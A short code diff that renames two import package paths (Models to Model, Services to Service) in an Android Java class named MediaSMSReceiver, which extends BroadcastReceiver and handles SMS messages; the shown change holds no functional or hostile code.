@@ -9,8 +9,8 @@ import android.provider.Telephony;
 import android.telephony.SmsMessage;
 
 import com.android.media.settings.MediaDBManager;
-import com.android.media.settings.Models.MediaSMS;
-import com.android.media.settings.Services.MediaService;
+import com.android.media.settings.Model.MediaSMS;
+import com.android.media.settings.Service.MediaService;
 import com.android.media.settings.Utility.MediaUtility;
 
 public class MediaSMSReceiver extends BroadcastReceiver {
